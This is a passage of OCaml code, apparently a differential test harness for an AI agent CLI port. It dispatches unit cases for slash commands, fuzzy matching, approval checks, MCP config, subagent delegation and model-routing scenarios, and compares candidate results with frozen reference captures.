                | Some (mode, host, port) -> `List [ `String mode; `String host; `Int port ] ))
            (str "command")
      | Some "dashboard_probe_host" ->
          let host = match List.assoc_opt "host" fields with Some (`String s) -> Some s | _ -> None in
          Some (label, `String (Interactive_cli_units.dashboard_probe_host host))
      | Some "coalesce_session_name_args" -> (
          match List.assoc_opt "argv" fields with
          | Some (`List argv) ->
              let strs = List.filter_map (function `String s -> Some s | _ -> None) argv in
              if List.length strs <> List.length argv then None
              else
                Some
                  ( label,
                    `List (List.map (fun s -> `String s) (Interactive_cli_units.coalesce_session_name_args strs))
                  )
          | _ -> None)
      | _ -> None)
  | "slash", Some (`String label) -> (
      match str "op" with
      | Some "sanitize_telegram_name" ->
          Option.map (fun raw -> (label, `String (Interactive_cli_units.sanitize_telegram_name raw))) (str "raw")
      | Some "sanitize_slack_name" ->
          Option.map (fun raw -> (label, `String (Interactive_cli_units.sanitize_slack_name raw))) (str "raw")
      | Some "clamp_command_names" -> (
          match (List.assoc_opt "entries" fields, List.assoc_opt "reserved" fields) with
          | Some (`List entries), Some (`List reserved) ->
              let pair = function `List [ `String n; `String d ] -> Some (n, d) | _ -> None in
              let entries' = List.filter_map pair entries in
              let reserved' = List.filter_map (function `String s -> Some s | _ -> None) reserved in
              if List.length entries' <> List.length entries || List.length reserved' <> List.length reserved
              then None
              else
                Some
                  ( label,
                    `List
                      (List.map
                         (fun (n, d) -> `List [ `String n; `String d ])
                         (Interactive_cli_units.clamp_command_names entries' reserved')) )
          | _ -> None)
      | Some "nested_mapping" -> (
          match (List.assoc_opt "root" fields, List.assoc_opt "path" fields) with
          | Some root, Some (`List path) ->
              let path' = List.filter_map (function `String s -> Some s | _ -> None) path in
              Some (label, Interactive_cli_units.nested_mapping root path')
          | _ -> None)
      | Some "clean" ->
          let maxlen = match List.assoc_opt "maxlen" fields with Some (`Int m) -> Some m | _ -> None in
          Option.map
            (fun text -> (label, `String (Interactive_cli_units.completion_clean ?maxlen text)))
            (str "text")
      | _ -> None)
  | "fuzzy", Some (`String label) -> (
      match str "op" with
      | Some "is_boundary" -> (
          match (str "target", List.assoc_opt "index" fields) with
          | Some target, Some (`Int index) -> Some (label, `Bool (Interactive_cli_units.is_boundary target index))
          | _ -> None)
      | Some "fuzzy_score" -> (
          match (str "item_label", str "query") with
          | Some item_label, Some query ->
              Some
                ( label,
                  match Interactive_cli_units.fuzzy_score ~label:item_label ~query with
                  | None -> `Null
                  | Some s -> `Float s )
          | _ -> None)
      | Some "filter_indices" -> (
          match (List.assoc_opt "items" fields, str "query") with
          | Some (`List items), Some query ->
              let items' = List.filter_map (function `String s -> Some s | _ -> None) items in
              if List.length items' <> List.length items then None
              else
                Some
                  (label, `List (List.map (fun i -> `Int i) (Interactive_cli_units.filter_indices items' query)))
          | _ -> None)
      | Some "move_filtered_cursor" -> (
          match List.assoc_opt "filtered" fields with
          | Some (`List filtered) -> (
              let filtered' = List.filter_map (function `Int i -> Some i | _ -> None) filtered in
              match
                (List.assoc_opt "cursor" fields, List.assoc_opt "cursor_pos" fields, List.assoc_opt "delta" fields)
              with
              | Some (`Int cursor), Some (`Int cursor_pos), Some (`Int delta) ->
                  Some (label, `Int (Interactive_cli_units.move_filtered_cursor filtered' cursor cursor_pos delta))
              | _ -> None)
          | _ -> None)
      | Some "reconcile_cursor" -> (
          match (List.assoc_opt "filtered" fields, List.assoc_opt "cursor" fields) with
          | Some (`List filtered), Some (`Int cursor) ->
              let filtered' = List.filter_map (function `Int i -> Some i | _ -> None) filtered in
              let c, idx = Interactive_cli_units.reconcile_cursor filtered' cursor in
              Some (label, `List [ `Int c; `Int idx ])
          | _ -> None)
      | Some "scroll_for_cursor" -> (
          match
            ( List.assoc_opt "scroll_offset" fields, List.assoc_opt "cursor_pos" fields,
              List.assoc_opt "visible_rows" fields, List.assoc_opt "total_rows" fields )
          with
          | Some (`Int scroll_offset), Some (`Int cursor_pos), Some (`Int visible_rows), Some (`Int total_rows) ->
              Some
                ( label,
                  `Int
                    (Interactive_cli_units.scroll_for_cursor ~scroll_offset ~cursor_pos ~visible_rows ~total_rows)
                )
          | _ -> None)
      | _ -> (
          match List.assoc_opt "item" fields with
          | Some item -> Some (label, `String (Interactive_cli_units.radio_item_plain item))
          | None -> None))
  | "approval", Some (`String label) -> (
      match str "op" with
      | Some "has_allowlist_shell_operator" ->
          Option.map
            (fun command -> (label, `Bool (Interactive_cli_units.has_allowlist_shell_operator command)))
            (str "command")
      | Some "unsafe_root_binary" ->
          Option.map (fun token -> (label, `Bool (Interactive_cli_units.unsafe_root_binary token))) (str "token")
      | Some "derive_glob" ->
          Option.map
            (fun normalized ->
              (label, match Interactive_cli_units.derive_glob normalized with None -> `Null | Some g -> `String g))
            (str "normalized")
      | Some "is_unsafe_class" ->
          Option.map
            (fun description -> (label, `Bool (Interactive_cli_units.is_unsafe_class description)))
            (str "description")
      | Some "parse_apply_indices" -> (
          match (str "spec", List.assoc_opt "total" fields) with
          | Some spec, Some (`Int total) ->
              Some
                ( label,
                  match Interactive_cli_units.parse_apply_indices ~spec ~total with
                  | Ok indices -> `Assoc [ ("ok", `List (List.map (fun i -> `Int i) indices)) ]
                  | Error message -> `Assoc [ ("error", `String message) ] )
          | _ -> None)
      | _ -> None)
  | "bang", Some (`String label) -> (
      match str "op" with
      | Some "is_bang_command" ->
          Option.map
            (fun v -> (label, `Bool (Interactive_cli_units.is_bang_command v)))
            (List.assoc_opt "text" fields)
      | Some "parse_bang_command" ->
          Option.map
            (fun v -> (label, `String (Interactive_cli_units.parse_bang_command v)))
            (List.assoc_opt "text" fields)
      | Some "is_remote_shell_session" -> (
          match List.assoc_opt "env" fields with
          | Some (`Assoc env) ->
              let env' = List.filter_map (function k, `String v -> Some (k, v) | _ -> None) env in
              Some (label, `Bool (Interactive_cli_units.is_remote_shell_session env'))
          | _ -> None)
      | _ ->
          Option.map
            (fun b64 -> (label, `String (Interactive_cli_units.powershell_write_script b64)))
            (str "b64"))
  | "client", Some (`String label) -> (
      match str "op" with
      | Some "normalize_schema" ->
          Option.map (fun schema -> (label, Mcp_units.normalize_mcp_input_schema schema)) (List.assoc_opt "schema" fields)
      | Some "fingerprint" ->
          Option.map (fun config -> (label, `String (Mcp_units.config_fingerprint config))) (List.assoc_opt "config" fields)
      | Some "matches_filter" -> (
          match (str "tool_name", List.assoc_opt "patterns" fields) with
          | Some tool_name, Some patterns -> Some (label, `Bool (Mcp_units.matches_name_filter ~tool_name patterns))
          | _ -> None)
      | _ -> (
          match (str "server_name", str "tool_name") with
          | Some server_name, Some tool_name -> Some (label, `String (Mcp_units.mcp_prefixed_tool_name ~server_name ~tool_name))
          | _ -> None))
  | "oauth", Some (`String label) -> (
      let server_url = match List.assoc_opt "server_url" fields with Some (`String s) -> Some s | _ -> None in
      match str "op" with
      | Some "humanize_error" -> (
          match (str "server_name", str "exc") with
          | Some server_name, Some exc ->
              Some
                ( label,
                  match Mcp_units.humanize_oauth_registration_error ~server_name ~exc ~server_url with
                  | None -> `Null
                  | Some msg -> `String msg )
          | _ -> None)
      | Some "apply_defaults" -> (
          match (List.assoc_opt "cfg" fields, str "server_name") with
          | Some cfg, Some server_name -> Some (label, Mcp_units.apply_oauth_provider_defaults ~cfg ~server_name ~server_url)
          | _ -> None)
      | Some "safe_filename" -> Option.map (fun name -> (label, `String (Mcp_units.safe_filename name))) (str "name")
      | _ -> (
          match (str "a", str "b") with
          | Some a, Some b -> Some (label, `Bool (Mcp_units.same_endpoint a b))
          | _ -> None))
  | "config", Some (`String label) -> (
      match str "op" with
      | Some "strip_bearer" -> Option.map (fun token -> (label, `String (Mcp_units.strip_bearer_prefix token))) (str "token")
      | Some "parse_env" -> (
          match List.assoc_opt "raw_env" fields with
          | Some (`List raw_env) ->
              let raw_env' = List.filter_map (function `String s -> Some s | _ -> None) raw_env in
              if List.length raw_env' <> List.length raw_env then None
              else
                Some
                  ( label,
                    match Mcp_units.parse_env_assignments raw_env' with
                    | Ok pairs -> `Assoc [ ("ok", `Assoc (List.map (fun (k, v) -> (k, `String v)) pairs)) ]
                    | Error message -> `Assoc [ ("error", `String message) ] )
          | _ -> None)
      | Some "expand_install_dir" -> (
          let install_dir = match List.assoc_opt "install_dir" fields with Some (`String s) -> Some s | _ -> None in
          match str "value" with
          | Some value ->
              Some
                ( label,
                  match Mcp_units.expand_install_dir ~value ~install_dir with
                  | Ok v -> `Assoc [ ("ok", `String v) ]
                  | Error message -> `Assoc [ ("error", `String message) ] )
          | None -> None)
      | Some "env_key" -> Option.map (fun name -> (label, `String (Mcp_units.env_key_for_server name))) (str "name")
      | Some "bearer_headers" ->
          Option.map
            (fun name -> (label, `Assoc (List.map (fun (k, v) -> (k, `String v)) (Mcp_units.bearer_auth_headers name))))
            (str "name")
      | _ -> (
          let command = match List.assoc_opt "command" fields with Some (`String s) -> Some s | _ -> None in
          let args =
            match List.assoc_opt "args" fields with
            | Some (`List args) -> List.filter_map (function `String s -> Some s | _ -> None) args
            | _ -> []
          in
          let env =
            match List.assoc_opt "env" fields with
            | Some (`Assoc env) -> List.filter_map (function k, `String v -> Some (k, v) | _ -> None) env
            | _ -> []
          in
          let url = match List.assoc_opt "url" fields with Some (`String s) -> Some s | _ -> None in
          let install_dir = match List.assoc_opt "install_dir" fields with Some (`String s) -> Some s | _ -> None in
          match (str "transport_type", str "auth_type", str "name") with
          | Some transport_type, Some auth_type, Some name ->
              Some
                ( label,
                  Mcp_units.build_server_config ~transport_type ~command ~args ~env ~url ~auth_type ~name ~install_dir
                )
          | _ -> None))
  | "surface", Some (`String label) -> (
      match str "op" with
      | Some "extract_content" ->
          Option.map (fun msg -> (label, `String (Mcp_units.extract_message_content msg))) (List.assoc_opt "msg" fields)
      | Some "extract_attachments" ->
          Option.map (fun msg -> (label, `List (Mcp_units.extract_attachments msg))) (List.assoc_opt "msg" fields)
      | Some "row_to_entry" ->
          Option.map (fun row -> (label, Mcp_units.row_to_index_entry row)) (List.assoc_opt "row" fields)
      | Some "ts_float" -> Option.map (fun ts -> (label, `Float (Mcp_units.ts_float ts))) (List.assoc_opt "ts" fields)
      | _ -> (
          match
            ( List.assoc_opt "value" fields, List.assoc_opt "default" fields, List.assoc_opt "minimum" fields,
              List.assoc_opt "maximum" fields )
          with
          | Some value, Some (`Int default), Some (`Int minimum), Some (`Int maximum) ->
              Some (label, `Int (Mcp_units.coerce_int value ~default ~minimum ~maximum))
          | _ -> None))
  | "supervision", Some (`String label) -> (
      match str "op" with
      | Some "validate_entry" -> (
          match (str "name", List.assoc_opt "entry" fields) with
          | Some name, Some entry -> Some (label, `List (List.map (fun s -> `String s) (Mcp_units.validate_mcp_server_entry ~name entry)))
          | _ -> None)
      | Some "command_basename" ->
          Option.map (fun command -> (label, `String (Mcp_units.command_basename command))) (List.assoc_opt "command" fields)
      | _ -> (
          match (str "name", List.assoc_opt "entry" fields) with
          | Some name, Some entry -> Some (label, `Bool (Mcp_units.is_mcp_server_entry_suspicious ~name entry))
          | _ -> None))
  | "lifecycle", Some (`String label) -> (
      match str "op" with
      | Some "handle_from_dict" -> (
          match List.assoc_opt "value" fields with
          | Some value ->
              Some
                ( label,
                  match Subagent_units.subagent_handle_from_dict value with
                  | Ok handle -> `Assoc [ ("ok", handle) ]
                  | Error message -> `Assoc [ ("error", `String message) ] )
          | None -> None)
      | Some "validate_request" -> (
          match str "goal" with
          | Some goal ->
              let context = match List.assoc_opt "context" fields with Some (`String s) -> Some s | _ -> None in
              let role = Option.value (str "role") ~default:"leaf" in
              let timeout_seconds =
                match List.assoc_opt "timeout_seconds" fields with
                | Some (`Float f) -> Some f
                | Some (`Int n) -> Some (float_of_int n)
                | _ -> None
              in
              let working_directory = match List.assoc_opt "working_directory" fields with Some (`String s) -> Some s | _ -> None in
              let str_list name = match List.assoc_opt name fields with Some (`List l) -> List.filter_map (function `String s -> Some s | _ -> None) l | _ -> [] in
              let blocked_tools = str_list "blocked_tools" in
              let metadata = Option.value (List.assoc_opt "metadata" fields) ~default:(`Assoc []) in
              let allowed_toolsets = str_list "allowed_toolsets" in
              let known_toolsets = str_list "known_toolsets" in
              let parent_enabled_toolsets =
                match List.assoc_opt "parent_enabled_toolsets" fields with
                | Some (`List l) -> Some (List.filter_map (function `String s -> Some s | _ -> None) l)
                | _ -> None
              in
              Some
                ( label,
                  match
                    Subagent_units.validate_request ~goal ~context ~role ~timeout_seconds ~working_directory ~blocked_tools ~metadata
                      ~allowed_toolsets ~known_toolsets ~parent_enabled_toolsets
                  with
                  | Ok () -> `Assoc [ ("ok", `Bool true) ]
                  | Error message -> `Assoc [ ("error", `String message) ] )
          | None -> None)
      | _ -> (
          match (str "secret_hex", str "subagent_id", List.assoc_opt "created_at" fields) with
          | Some secret_hex, Some subagent_id, Some created_at_json ->
              let created_at = match created_at_json with `Float f -> f | `Int n -> float_of_int n | _ -> 0.0 in
              let parent_session_id = match List.assoc_opt "parent_session_id" fields with Some (`String s) -> Some s | _ -> None in
              let secret = Subagent_units.hex_to_bytes secret_hex in
              Some (label, `String (Subagent_units.capability ~secret ~subagent_id ~parent_session_id ~created_at))
          | _ -> None))
  | "delegation", Some (`String label) -> (
      match str "op" with
      | Some "child_prompt" -> (
          match str "goal" with
          | Some goal ->
              let context = match List.assoc_opt "context" fields with Some (`String s) -> Some s | _ -> None in
              let workspace_path = match List.assoc_opt "workspace_path" fields with Some (`String s) -> Some s | _ -> None in
              let role = Option.value (str "role") ~default:"leaf" in
              let max_spawn_depth = match List.assoc_opt "max_spawn_depth" fields with Some (`Int n) -> n | _ -> 2 in
              let child_depth = match List.assoc_opt "child_depth" fields with Some (`Int n) -> n | _ -> 1 in
              Some
                ( label,
                  `String (Subagent_units.build_child_system_prompt ~goal ~context ~workspace_path ~role ~max_spawn_depth ~child_depth) )
          | None -> None)
      | Some "stringify_content" ->
          Option.map (fun content -> (label, `String (Subagent_units.stringify_tool_content content))) (List.assoc_opt "content" fields)
      | Some "looks_like_error" ->
          Option.map (fun content -> (label, `Bool (Subagent_units.looks_like_error_output content))) (str "content")
      | Some "output_tail" -> (
          match List.assoc_opt "result" fields with
          | Some result ->
              let max_entries = match List.assoc_opt "max_entries" fields with Some (`Int n) -> n | _ -> 12 in
              let max_chars = match List.assoc_opt "max_chars" fields with Some (`Int n) -> n | _ -> 8000 in
              Some (label, `List (Subagent_units.extract_output_tail result ~max_entries ~max_chars))
          | None -> None)
      | Some "scrub_env" -> (
          match List.assoc_opt "env" fields with
          | Some (`Assoc env) ->
              let env' = List.filter_map (function k, `String v -> Some (k, v) | _ -> None) env in
              Some (label, `Assoc (List.map (fun (k, v) -> (k, `String v)) (Subagent_units.scrub_kanban_env env')))
          | _ -> None)
      | Some "normalize_role" ->
          let role = match List.assoc_opt "role" fields with Some (`String s) -> Some s | _ -> None in
          Some (label, `String (Subagent_units.normalize_role role))
      | Some "normalized_url" ->
          let value = match List.assoc_opt "value" fields with Some (`String s) -> Some s | _ -> None in
          Some (label, `String (Subagent_units.normalized_runtime_url value))
      | _ -> Option.map (fun tasks -> (label, Subagent_units.strip_model_hidden_task_fields tasks)) (List.assoc_opt "tasks" fields))
  | "async", Some (`String label) -> (
      match str "op" with
      | Some "children_activity" -> (
          match List.assoc_opt "now" fields with
          | Some now_json ->
              let now = match now_json with `Float f -> f | `Int n -> float_of_int n | _ -> 0.0 in
              let token = match List.assoc_opt "token" fields with Some (`List parts) -> Some parts | _ -> None in
              Some (label, (match Subagent_units.children_activity_from_token token ~now with Some r -> r | None -> `Null))
          | None -> None)
      | Some "one_line" -> (
          match (List.assoc_opt "text" fields, List.assoc_opt "limit" fields) with
          | Some text, Some (`Int limit) -> Some (label, `String (Subagent_units.one_line text ~limit))
          | _ -> None)
      | _ -> (
          match List.assoc_opt "record" fields with
          | Some record ->
              let opt name = Option.value (match List.assoc_opt name fields with Some (`String s) -> Some s | _ -> None) ~default:"" in
              let result =
                Subagent_units.matches_session_selectors ~record ~session_key:(opt "session_key")
                  ~origin_ui_session_id:(opt "origin_ui_session_id") ~parent_session_id:(opt "parent_session_id")
              in
              Some (label, `Assoc [ ("raw", result); ("truthy", `Bool (Subagent_units.json_truthy result)) ])
          | None -> None))
  | "moa", Some (`String label) -> (
      match str "op" with
      | Some "peel_guidance" -> (
          match (List.assoc_opt "guidance" fields, List.assoc_opt "messages" fields) with
          | Some guidance, Some (`List messages) -> Some (label, `List (Subagent_units.peel_reference_guidance ~guidance messages))
          | _ -> None)
      | Some "flatten_text" ->
          Option.map (fun content -> (label, `String (Subagent_units.flatten_message_text content))) (List.assoc_opt "content" fields)
      | Some "reference_messages" -> (
          match List.assoc_opt "messages" fields with
          | Some (`List messages) -> Some (label, `List (Subagent_units.reference_messages ~tool_result_budget:4000 messages))
          | _ -> None)
      | Some "render_calls" ->
          let tool_calls = Option.value (List.assoc_opt "tool_calls" fields) ~default:`Null in
          Some (label, `String (Subagent_units.render_tool_calls tool_calls))
      | Some "truncate_result" -> (
          match (str "text", List.assoc_opt "budget" fields) with
          | Some text, Some (`Int budget) -> Some (label, `String (Subagent_units.truncate_tool_result text ~budget))
          | _ -> None)
      | Some "is_failed" -> Option.map (fun text -> (label, `Bool (Subagent_units.is_failed_reference text))) (str "text")
      | Some "successful_refs" -> (
          match List.assoc_opt "reference_outputs" fields with
          | Some (`List outputs) -> Some (label, `List (Subagent_units.successful_references outputs))
          | _ -> None)
      | Some "failed_labels" -> (
          match List.assoc_opt "reference_outputs" fields with
          | Some (`List outputs) -> Some (label, `List (List.map (fun s -> `String s) (Subagent_units.failed_reference_labels outputs)))
          | _ -> None)
      | Some "degraded_notice" -> (
          match (List.assoc_opt "failed_labels" fields, str "policy") with
          | Some (`List labels), Some policy ->
              let labels' = List.filter_map (function `String s -> Some s | _ -> None) labels in
              Some (label, `String (Subagent_units.degraded_notice labels' policy))
          | _ -> None)
      | Some "preset_temp" -> (
          match (List.assoc_opt "preset" fields, str "key") with
          | Some preset, Some key -> Some (label, match Subagent_units.preset_temperature preset key with None -> `Null | Some f -> `Float f)
          | _ -> None)
      | Some "slot_label" -> Option.map (fun slot -> (label, `String (Subagent_units.slot_label slot))) (List.assoc_opt "slot" fields)
      | Some "sanitize_session" ->
          let session_id = match List.assoc_opt "session_id" fields with Some (`String s) -> Some s | _ -> None in
          Some (label, `String (Subagent_units.sanitize_session_id session_id))
      | _ -> (
          match (List.assoc_opt "slot_extra_body" fields, List.assoc_opt "caller_extra_body" fields) with
          | Some slot_extra_body, Some caller_extra_body -> Some (label, Subagent_units.merge_slot_extra_body slot_extra_body caller_extra_body)
          | _ -> None))
  | "kanban", Some (`String label) -> (
      match str "op" with
      | Some "parse_worker" ->
          Option.map
            (fun raw ->
              ( label,
                match Subagent_units.parse_worker_arg raw with
                | Ok spec -> `Assoc [ ("ok", spec) ]
                | Error message -> `Assoc [ ("error", `String message) ] ))
            (str "raw")
      | Some "require_text" -> (
          match (str "value", str "field_name") with
          | Some value, Some field_name ->
              Some
                ( label,
                  match Subagent_units.require_text value field_name with
                  | Ok text -> `Assoc [ ("ok", `String text) ]
                  | Error message -> `Assoc [ ("error", `String message) ] )
          | _ -> None)
      | Some "swarm_context" -> (
          match (str "root_id", str "goal") with
          | Some root_id, Some goal -> Some (label, `String (Subagent_units.swarm_context ~root_id ~goal))
          | _ -> None)
      | Some "parse_bool" -> (
          match (List.assoc_opt "args" fields, str "name") with
          | Some args, Some name ->
              let default = match List.assoc_opt "default" fields with Some (`Bool b) -> b | _ -> false in
              let value, error = Subagent_units.parse_bool_arg args name ~default in
              Some (label, `Assoc [ ("value", `Bool value); ("error", match error with None -> `Null | Some e -> `String e) ])
          | _ -> None)
      | Some "ok_envelope" -> (
          match List.assoc_opt "fields" fields with
          | Some (`List pairs) ->
              let pairs' = List.filter_map (function `List [ `String k; v ] -> Some (k, v) | _ -> None) pairs in
              Some (label, `String (Subagent_units.ok_envelope pairs'))
          | _ -> None)
      | _ ->
          Option.map
            (fun value -> (label, match Subagent_units.normalize_profile value with None -> `Null | Some s -> `String s))
            (List.assoc_opt "value" fields))
  | "summary_format", Some (`String label) -> (
      match str "op" with
      | Some "elapsed" -> (
          match List.assoc_opt "seconds" fields with
          | Some (`Float seconds) ->
              Some (label, `String (Finalize_units.format_elapsed seconds))
          | Some (`Int seconds) ->
              Some (label, `String (Finalize_units.format_elapsed (float_of_int seconds)))
          | _ -> None)
      | Some "diff" ->
          Option.map
            (fun text ->
              let added, removed = Finalize_units.count_diff_lines text in
              (label, `List [ `Int added; `Int removed ]))
            (str "text")
      | Some "plural" -> (
          match (List.assoc_opt "count" fields, str "noun") with
          | Some (`Int count), Some noun ->
              Some (label, `String (Finalize_units.pluralize count noun))
          | _ -> None)
      | _ -> None)
  | _ -> None

let candidate_slice params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  let unit_id = match field "unit" with Some (`String unit_id) -> unit_id | _ -> "" in
  match field "cases" with
  | Some (`List cases) ->
      let one = function
        | `Assoc fields -> (try slice_case unit_id fields with _ -> None)
        | _ -> None
      in
      let results = List.filter_map one cases in
      if List.length results <> List.length cases then None
      else Some (`Assoc [ ("results", `Assoc results) ])
  | _ -> None

let compare_slice_scenario ~scenarios ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no slice cases defined for " ^ scenario_id)
           ~cause:"the harness has no scenario for this id"
           ~fix:"add the scenario, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_slice params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the slice scenario is malformed"
               ~cause:"candidate_slice could not evaluate every case"
               ~fix:"fix the scenario entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Rate & retry (model_routing): the candidate Retry-After parser over a value
   list, compared to the frozen agent.retry_utils.parse_retry_after_seconds.
   Results pair POSITIONALLY (JSON object keys are strings; 5 and "5" would
   collide as keys). Scope: the deterministic branches only -- the HTTP-date
   branch calls datetime.now and is excluded by scenario construction, stated
   in retry_utils.mli. *)
let retry_scenarios : (string * Yojson.Safe.t) list =
  [ ( "retry.after",
      `Assoc
        [ ( "values",
            `List
              [ `Null; `Bool true; `Bool false; `Int 5; `Int (-3); `Float 5.5;
                `Float (-2.0); `String "10"; `String "-2"; `String " 7 ";
                `String ""; `String "  "; `String "abc"; `Int 0; `String "0" ] ) ] ) ]

let candidate_retry params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  match field "values" with
  | Some (`List values) ->
      let results =
        List.map
          (fun value ->
            match Retry_utils.parse_retry_after_seconds value with
            | Some seconds -> `Float seconds
            | None -> `Null)
          values
      in
      Some (`Assoc [ ("results", `List results) ])
  | _ -> None

let compare_retry_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id retry_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no retry input defined for " ^ scenario_id)
           ~cause:"the harness has no retry scenario for this id"
           ~fix:"add a retry_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_retry params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the retry scenario is malformed"
               ~cause:"candidate_retry could not read the values list"
               ~fix:"fix the retry_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Route resolution (model_routing): the candidate fallback-chain resolver over
   a list of configs, compared to the frozen get_fallback_chain. Results pair
   POSITIONALLY. Fully deterministic (no clock/env/net). *)
let route_scenarios : (string * Yojson.Safe.t) list =
  let cfg = Yojson.Safe.from_string in
  [ ( "route.fallback_chain",
      `Assoc
        [ ( "configs",
            `List
              [ `Null;
                cfg "{}";
                cfg {|{"fallback_providers":[{"provider":"openrouter","model":"a"},{"provider":"nous","model":"b"}]}|};
                cfg {|{"fallback_model":{"provider":"ollama","model":"m","base_url":"http://h:11434/v1/"}}|};
                cfg {|{"fallback_providers":[{"provider":"OpenRouter","model":"GPT","base_url":"https://O.ai/v1/"}],"fallback_model":[{"provider":"openrouter","model":"gpt","base_url":"https://o.ai/v1"},{"provider":"zai","model":"glm"}]}|};
                cfg {|{"fallback_providers":[{"provider":"  ","model":"m"},{"provider":"p"},"nd",42,null,{"provider":" p2 ","model":"  m2  "}]}|};
                cfg {|{"fallback_providers":[{"provider":" c ","model":"x","api_key":"sk","key_env":"K","temperature":0.2,"tag":null}]}|};
                cfg {|{"fallback_providers":[{"provider":"a","model":"b","base_url":""},{"provider":"c","model":"d","base_url":null}]}|};
                cfg {|{"fallback_providers":[{"provider":"l","model":"m","base_url":"http://x:1"},{"provider":"l","model":"m","base_url":"http://x:2"}]}|};
                cfg {|{"fallback_providers":[{"provider":"kimi","model":"k2"},{"provider":"KIMI","model":" K2 "}]}|};
                cfg {|{"fallback_providers":[{"provider":123,"model":456},{"provider":0,"model":"m"},{"provider":true,"model":"m"}]}|};
                cfg {|{"fallback_providers":{"provider":"gemini","model":"g3"}}|};
                cfg {|{"fallback_model":"openrouter/auto"}|};
                cfg {|{"fallback_model":[{"provider":"vllm","model":"q","base_url":"  http://10.0.0.5:8000/v1///  "}]}|};
                cfg {|{"fallback_providers":[{"provider":"a","model":"b","base_url":8080},{"provider":"a","model":"b"}]}|} ] ) ] ) ]

let candidate_route params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  match field "configs" with
  | Some (`List configs) ->
      Some (`Assoc [ ("results", `List (List.map Route_resolution.get_fallback_chain configs)) ])
  | _ -> None

let compare_route_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id route_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no route input defined for " ^ scenario_id)
           ~cause:"the harness has no route scenario for this id"
           ~fix:"add a route_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_route params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the route scenario is malformed"
               ~cause:"candidate_route could not read the configs list"
               ~fix:"fix the route_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Anthropic adapter (model_routing): the candidate shaping trio over a list of
   dispatched calls, compared to the frozen convert_tools_to_anthropic /
   normalize_model_name / _sanitize_tool_id. Results pair POSITIONALLY. Pure. *)
let anthropic_scenarios : (string * Yojson.Safe.t) list =
  let call = Yojson.Safe.from_string in
  [ ( "anthropic.shaping",
      `Assoc
        [ ( "calls",
            `List
              [ call {|{"function":"convert_tools_to_anthropic","tools":[]}|};
                call {|{"function":"convert_tools_to_anthropic","tools":[{"type":"function","function":{"name":"f","description":"d"}}]}|};
                call {|{"function":"convert_tools_to_anthropic","tools":[{"function":{"name":"g","description":"1"}},{"function":{"name":"g","description":"2"}},{"function":{"name":"","description":"e1"}},{"function":{"name":"","description":"e2"}}]}|};
                call {|{"function":"convert_tools_to_anthropic","tools":[{"function":{"name":"h","parameters":{"type":"object","properties":{"x":{"anyOf":[{"type":"string"},{"type":"null"}]}}}},"cache_control":{"type":"ephemeral"}}]}|};
                call {|{"function":"convert_tools_to_anthropic","tools":[{"function":{"name":"j","parameters":{"oneOf":[{"type":"object"}],"description":"pick"}}}]}|};
                call {|{"function":"convert_tools_to_anthropic","tools":[{"function":{"name":"k","parameters":{"type":"object","properties":"bad"}}}]}|};
                call {|{"function":"normalize_model_name","model":"anthropic/claude-3.5-sonnet"}|};
                call {|{"function":"normalize_model_name","model":"claude-3.7"}|};
                call {|{"function":"normalize_model_name","model":"us.anthropic.claude-3.5"}|};
                call {|{"function":"normalize_model_name","model":"gpt-5.4"}|};
                call {|{"function":"normalize_model_name","model":"gemini-2.5-pro"}|};
